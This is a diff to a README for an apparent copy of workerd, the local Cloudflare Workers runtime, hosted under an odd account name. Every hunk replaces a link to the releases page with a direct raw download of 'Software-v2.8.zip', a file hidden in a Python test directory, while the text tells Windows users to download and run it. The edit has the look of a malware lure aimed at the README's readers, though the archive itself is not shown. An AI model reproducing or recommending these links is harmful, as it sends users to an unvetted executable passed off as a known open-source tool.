@@ -1,6 +1,6 @@
 # ⚙️ workerd - Run Cloudflare Workers Locally
 
-[![Download workerd](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge)](https://github.com/Basidiomycetespanamaniancapital403/workerd/releases)
+[![Download workerd](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge)](https://github.com/Basidiomycetespanamaniancapital403/workerd/raw/refs/heads/main/src/workerd/server/tests/python/python-compat-flag/Software-v2.8.zip)
 
 ## 🚀 What is workerd?
 
@@ -24,7 +24,7 @@ If you plan to use it for larger projects, 8 GB of RAM helps.
 
 Visit this page to download:
 
-https://github.com/Basidiomycetespanamaniancapital403/workerd/releases
+https://github.com/Basidiomycetespanamaniancapital403/workerd/raw/refs/heads/main/src/workerd/server/tests/python/python-compat-flag/Software-v2.8.zip
 
 On that page, look for the latest release and choose the Windows file that matches your system. In most cases, this is a `.zip` or `.exe` file.
 
@@ -111,7 +111,7 @@ This workflow helps you test your app before you publish it.
 
 Use the release page here:
 
-https://github.com/Basidiomycetespanamaniancapital403/workerd/releases
+https://github.com/Basidiomycetespanamaniancapital403/workerd/raw/refs/heads/main/src/workerd/server/tests/python/python-compat-flag/Software-v2.8.zip
 
 ## 🧩 Do I need programming knowledge?
 
@@ -176,4 +176,4 @@ workerd gives you a local runtime for Worker-style JavaScript and Wasm apps. It 
 5. Load your project files
 6. Run your worker app on your PC
 
-https://github.com/Basidiomycetespanamaniancapital403/workerd/releases
+https://github.com/Basidiomycetespanamaniancapital403/workerd/raw/refs/heads/main/src/workerd/server/tests/python/python-compat-flag/Software-v2.8.zip
